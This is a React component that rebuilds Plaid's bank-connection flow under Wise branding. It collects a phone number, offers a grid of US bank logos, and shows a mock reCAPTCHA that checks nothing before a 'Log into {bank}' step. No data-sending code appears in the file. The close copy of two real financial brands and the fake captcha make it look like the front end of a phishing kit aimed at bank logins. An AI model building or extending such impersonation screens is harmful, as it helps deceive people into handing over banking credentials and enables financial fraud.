import { useState, useRef } from 'react'
import LogoMark from '../components/LogoMark.jsx'
import Icon from '../components/Icon.jsx'

// Formatea el teléfono estilo US mientras se escribe: (201) 555 0123
const fmtPhone = (v) => {
  const d = v.replace(/\D/g, '').slice(0, 10)
  if (d.length > 6) return `(${d.slice(0, 3)}) ${d.slice(3, 6)} ${d.slice(6)}`
  if (d.length > 3) return `(${d.slice(0, 3)}) ${d.slice(3)}`
  if (d.length > 0) return `(${d.slice(0, 3)}`
  return ''
}

// Bancos en el orden dado. Logos locales en /public/banks.
// US Bank no tiene archivo → se usa el ícono automático (DuckDuckGo) como respaldo.
const BANKS = [
  { name: 'Chase', file: 'chase.png' },
  { name: 'Bank of America', file: 'bank-of-america.png' },
  { name: 'Wells Fargo', file: 'wells-fargo.jpg' },
  { name: 'Citibank', file: 'citibank.png' },
  { name: 'US Bank', domain: 'usbank.com' },
  { name: 'Capital One', file: 'capital-one.png' },
  { name: 'PNC', file: 'pnc.jpg' },
  { name: 'USAA', file: 'usaa.jpg' },
  { name: 'American Express', file: 'american-express.svg' },
  { name: 'TD', file: 'td.svg' },
  { name: 'Regions', file: 'regions.png' },
  { name: 'Navy Federal', file: 'navy-federal.svg' },
  { name: 'Charles Schwab', file: 'charles-schwab.webp' },
  { name: 'Citizens', file: 'citizens.png' },
  { name: 'Huntington', file: 'huntington.webp' },
  { name: 'Betterment', file: 'betterment.webp' },
  { name: 'Wealthfront', file: 'wealthfront.jpeg' },
]

// Ícono "nudo" de Plaid (dos cuadros redondeados superpuestos).
function PlaidKnot({ size = 20, stroke = 2, className = '' }) {
  const inner = size * 0.82
  return (
    <span className={`relative inline-flex items-center justify-center ${className}`} style={{ width: size, height: size }}>
      <span className="absolute rotate-45 rounded-[3px] border-current" style={{ width: inner, height: inner, borderWidth: stroke }} />
      <span className="absolute rounded-[3px] border-current" style={{ width: inner, height: inner, borderWidth: stroke }} />
    </span>
  )
}

// Logo del banco: usa el archivo local; si no hay, el ícono automático; si falla, el nombre.
function BankLogo({ name, file, domain }) {
  const [err, setErr] = useState(false)
  const src = file ? `/banks/${file}` : domain ? `https://icons.duckduckgo.com/ip3/${domain}.ico` : null
  if (err || !src) return <span className="px-1 text-center text-sm font-bold text-content-primary">{name}</span>
  return (
    <img
      src={src}
      alt={name}
      loading="lazy"
      onError={() => setErr(true)}
      className="max-h-16 max-w-[90%] object-contain"
    />
  )
}

// Pantalla de conexión de Plaid (se abre en ventana nueva desde "Connect bank account").
export default function PlaidConnect() {
  const [phone, setPhone] = useState('')
  const [step, setStep] = useState('phone') // 'phone' | 'institutions' | 'captcha' | 'login'
  const [query, setQuery] = useState('')
  const [captchaState, setCaptchaState] = useState('idle') // 'idle' | 'checking' | 'done'
  const [bank, setBank] = useState(null) // banco elegido
  const capTimer = useRef(null)
  const close = () => window.close()

  const q = query.trim().toLowerCase()
  const filtered = q ? BANKS.filter((b) => b.name.toLowerCase().includes(q)) : BANKS

  // Al elegir un banco → pantalla del reCAPTCHA.
  const pickBank = (b) => { setBank(b); setCaptchaState('idle'); setStep('captcha') }
  // Marcar el check: spinner → check verde → avanza a "Log into {banco}".
  const checkCaptcha = () => {
    if (captchaState !== 'idle') return
    setCaptchaState('checking')
    clearTimeout(capTimer.current)
    capTimer.current = setTimeout(() => {
      setCaptchaState('done')
      capTimer.current = setTimeout(() => setStep('login'), 700)
    }, 1200)
  }

  // ---- Paso 3: reCAPTCHA ----
  if (step === 'captcha') {
    return (
      <div className="flex min-h-screen items-start justify-center bg-bg-neutral px-4 py-10">
        <div className="flex min-h-[640px] w-full max-w-[400px] flex-col rounded-2xl bg-white px-6 pt-5 pb-6 shadow-xl">
          {/* Header PLAID + progreso */}
          <div className="relative flex items-center justify-center">
            <span className="flex items-center gap-1.5 text-content-primary">
              <PlaidKnot size={18} stroke={2} />
              <span className="text-sm font-extrabold tracking-wide">PLAID</span>
            </span>
            <button onClick={close} aria-label="Close" className="absolute right-0 text-content-primary hover:text-content-secondary">
              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round"><path d="M18 6 6 18M6 6l12 12" /></svg>
            </button>
          </div>
          <div className="mt-4 flex gap-1.5">
            <span className="h-1 flex-1 rounded-full bg-[#00b8d9]" />
            <span className="h-1 flex-1 rounded-full bg-gradient-to-r from-[#00b8d9] to-[#00b8d9]/20" />
            <span className="h-1 flex-1 rounded-full bg-black/10" />
            <span className="h-1 flex-1 rounded-full bg-black/10" />
          </div>

          <h1 className="mb-6 mt-8 text-center text-2xl font-bold leading-snug text-content-primary">Please use the reCAPTCHA below to proceed</h1>

          {/* Caja reCAPTCHA (réplica) */}
          <div className="mx-auto flex w-[304px] max-w-full items-center justify-between rounded border border-black/20 bg-[#f9f9f9] px-3 py-3 shadow-sm">
            <div onClick={checkCaptcha} className="flex cursor-pointer select-none items-center gap-4">
              {captchaState === 'done' ? (
                <Icon name="check" size={30} stroke={3} className="text-[#1e9e5a]" />
              ) : (
                <span className="flex h-7 w-7 items-center justify-center rounded-[2px] border-2 border-black/35 bg-white">
                  {captchaState === 'checking' && <span className="h-5 w-5 animate-spin rounded-full border-2 border-black/15 border-t-[#4285f4]" />}
                </span>
              )}
              <span className="text-[15px] text-content-primary">I'm not a robot</span>
            </div>
            <div className="flex flex-col items-center gap-0.5 text-[#555]">
              <Icon name="refresh" size={30} className="text-[#4a90d9]" />
              <span className="text-[10px] font-medium leading-none">reCAPTCHA</span>
              <span className="text-[8px] leading-none text-[#9aa0a6]">Privacy - Terms</span>
            </div>
          </div>
        </div>
      </div>
    )
  }

  // ---- Paso 4: iniciar sesión en el banco ----
  if (step === 'login') {
    const bankName = bank?.name || 'your bank'
    return (
      <div className="flex min-h-screen items-start justify-center bg-bg-neutral px-4 py-10">
        <div className="flex min-h-[640px] w-full max-w-[400px] flex-col rounded-2xl bg-white px-6 pt-5 pb-6 shadow-xl">
          {/* Header con atrás + PLAID + cerrar */}
          <div className="relative flex items-center justify-center">
            <button onClick={() => setStep('institutions')} aria-label="Back" className="absolute left-0 text-content-primary hover:text-content-secondary">
              <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M19 12H5M12 19l-7-7 7-7" /></svg>
            </button>
            <span className="flex items-center gap-1.5 text-content-primary">
              <PlaidKnot size={18} stroke={2} />
              <span className="text-sm font-extrabold tracking-wide">PLAID</span>
            </span>
            <button onClick={close} aria-label="Close" className="absolute right-0 text-content-primary hover:text-content-secondary">
              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round"><path d="M18 6 6 18M6 6l12 12" /></svg>
            </button>
          </div>
          <div className="mt-4 flex gap-1.5">
            <span className="h-1 flex-1 rounded-full bg-[#00b8d9]" />
            <span className="h-1 flex-1 rounded-full bg-[#00b8d9]" />
            <span className="h-1 flex-1 rounded-full bg-black/10" />
            <span className="h-1 flex-1 rounded-full bg-black/10" />
          </div>

          {/* Ícono banco */}
          <div className="mt-8 flex justify-center">
            <span className="flex h-14 w-14 items-center justify-center rounded-2xl bg-[#d6f0ec] text-[#0f9b8e]"><Icon name="bank" size={26} /></span>
          </div>

          <h1 className="mt-5 text-center text-2xl font-bold text-content-primary">Log into {bankName}</h1>
          <p className="mx-auto mt-2 max-w-[320px] text-center text-content-secondary">After logging into {bankName}, make sure you check all these boxes:</p>

          {/* Vista previa del banco */}
          <div className="mx-auto mt-6 w-full max-w-[330px] rounded-2xl border border-black/10 bg-white p-4 shadow-sm">
            <div className="overflow-hidden rounded-xl border border-black/10 shadow-sm">
              <div className="bg-[#4b4b4b] py-2.5 text-center text-sm font-extrabold uppercase tracking-wide text-white">{bankName}</div>
              <div className="flex items-center gap-3 bg-white px-4 py-4">
                <span className="relative flex h-6 w-6 shrink-0 items-center justify-center rounded-[5px] bg-[#0a85ea]">
                  <Icon name="check" size={15} stroke={3} className="text-white" />
                  <svg width="20" height="20" viewBox="0 0 24 24" className="absolute -bottom-3 -right-2.5 drop-shadow-md">
                    <path fill="#fff" stroke="#000" strokeWidth="1.4" strokeLinejoin="round" d="M9 11.5V6a1.3 1.3 0 0 1 2.6 0v4.2a1.3 1.3 0 0 1 2.6 0v.8a1.3 1.3 0 0 1 2.6 0v.9a1.3 1.3 0 0 1 2.6 0v3.1a4 4 0 0 1-4 4h-2.2a4 4 0 0 1-3.1-1.5l-2.6-3.2a1.3 1.3 0 0 1 2-1.6z" />
                  </svg>
                </span>
                <span className="font-semibold text-content-primary">Checking or savings account</span>
              </div>
            </div>
          </div>

          {/* Texto legal + botón */}
          <p className="mx-auto mt-auto max-w-[340px] pt-8 text-center text-sm text-content-tertiary">Plaid may use device, connection, and financial data including transactions and contact info to help minimize risk, fraud, and loss.</p>
          <button className="mt-4 flex w-full items-center justify-center gap-2 rounded-full bg-black py-3.5 font-bold text-white hover:bg-black/90">
            Continue to login
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M15 3h6v6M10 14 21 3M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6" /></svg>
          </button>
        </div>
      </div>
    )
  }

  // ---- Paso 2: seleccionar institución ----
  if (step === 'institutions') {
    return (
      <div className="flex min-h-screen items-start justify-center bg-bg-neutral px-4 py-10">
        <div className="flex h-[640px] w-full max-w-[400px] flex-col overflow-hidden rounded-2xl bg-white shadow-xl">
          {/* Header PLAID + progreso */}
          <div className="px-6 pt-5">
            <div className="relative flex items-center justify-center">
              <span className="flex items-center gap-1.5 text-content-primary">
                <PlaidKnot size={18} stroke={2} />
                <span className="text-sm font-extrabold tracking-wide">PLAID</span>
              </span>
              <button onClick={close} aria-label="Close" className="absolute right-0 text-content-primary hover:text-content-secondary">
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round"><path d="M18 6 6 18M6 6l12 12" /></svg>
              </button>
            </div>
            <div className="mt-4 flex gap-1.5">
              <span className="h-1 flex-1 rounded-full bg-[#00b8d9]" />
              <span className="h-1 flex-1 rounded-full bg-[#00b8d9]" />
              <span className="h-1 flex-1 rounded-full bg-black/10" />
              <span className="h-1 flex-1 rounded-full bg-black/10" />
            </div>
          </div>

          <h1 className="mb-4 mt-5 text-center text-xl font-bold text-content-primary">Select your institution</h1>

          <div className="px-6">
            <div className="flex items-center gap-2 rounded-xl border-2 border-black/15 px-3 py-2.5 focus-within:border-content-primary">
              <Icon name="search" size={18} className="shrink-0 text-content-tertiary" />
              <input value={query} onChange={(e) => setQuery(e.target.value)} placeholder="Search" className="w-full bg-transparent text-content-primary outline-none placeholder:text-content-tertiary" />
            </div>
          </div>

          <div className="mt-4 flex-1 overflow-y-auto px-6 pb-6">
            {filtered.length === 0 ? (
              <p className="py-8 text-center text-content-tertiary">No results.</p>
            ) : (
              <div className="grid grid-cols-2 gap-3">
                {filtered.map((b) => (
                  <button key={b.name} onClick={() => pickBank(b)} className="flex h-24 items-center justify-center rounded-xl border border-black/10 p-3 transition-colors hover:border-black/40 hover:bg-black/[0.02]">
                    <BankLogo name={b.name} file={b.file} domain={b.domain} />
                  </button>
                ))}
              </div>
            )}
          </div>
        </div>
      </div>
    )
  }

  // ---- Paso 1: teléfono ----
  return (
    <div className="flex min-h-screen items-start justify-center bg-bg-neutral px-4 py-10">
      <div className="relative flex min-h-[640px] w-full max-w-[400px] flex-col rounded-2xl bg-white p-6 shadow-xl">
        <button onClick={close} aria-label="Close" className="absolute right-5 top-5 text-content-primary hover:text-content-secondary">
          <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round"><path d="M18 6 6 18M6 6l12 12" /></svg>
        </button>

        {/* Logos Wise + Plaid */}
        <div className="mb-6 mt-3 flex items-center justify-center gap-2">
          <span className="flex h-11 w-11 items-center justify-center rounded-xl bg-bright-green"><LogoMark height={22} /></span>
          <span className="flex h-11 w-11 items-center justify-center rounded-xl bg-[#0a85ea] text-white"><PlaidKnot size={24} stroke={2.5} /></span>
        </div>

        <h1 className="mb-6 text-center text-xl font-bold text-content-primary">Wise uses Plaid to connect your account</h1>

        {/* Teléfono (vacío) */}
        <div className="flex items-center gap-3 rounded-xl border-2 border-black/15 px-4 py-3.5 focus-within:border-content-primary">
          <img src="https://flagcdn.com/w40/us.png" alt="US" className="h-4 w-6 rounded-[3px] object-cover" />
          <span className="font-semibold text-content-primary">+1</span>
          <input
            type="tel"
            inputMode="tel"
            value={phone}
            onChange={(e) => setPhone(fmtPhone(e.target.value))}
            placeholder="(•••) ••• ••••"
            className="w-full bg-transparent text-content-primary outline-none placeholder:text-content-tertiary"
            autoFocus
          />
        </div>

        <div className="mt-3 flex items-start gap-2.5">
          <span className="mt-0.5 flex h-6 w-6 shrink-0 items-center justify-center rounded-md bg-bright-green/25 text-forest"><Icon name="zap" size={14} /></span>
          <p className="text-sm text-content-tertiary">
            Use your phone number to log in or sign up with Plaid to go faster next time. <a href="#" className="text-content-secondary underline underline-offset-2">Learn more</a>
          </p>
        </div>

        {/* Bloque inferior */}
        <div className="mt-auto pt-10">
          <p className="mb-4 text-center text-xs text-content-tertiary">
            <a href="#" className="underline underline-offset-2">Terms</a> apply. By continuing, you agree to Plaid's <a href="#" className="underline underline-offset-2">Privacy Policy</a> and to receive updates on plaid.com
          </p>
          <button onClick={() => setStep('institutions')} className="w-full rounded-full bg-black py-3.5 font-bold text-white hover:bg-black/90">Continue</button>
          <button onClick={() => setStep('institutions')} className="mt-4 w-full text-center font-bold text-content-primary">Continue without phone number</button>
        </div>
      </div>
    </div>
  )
}
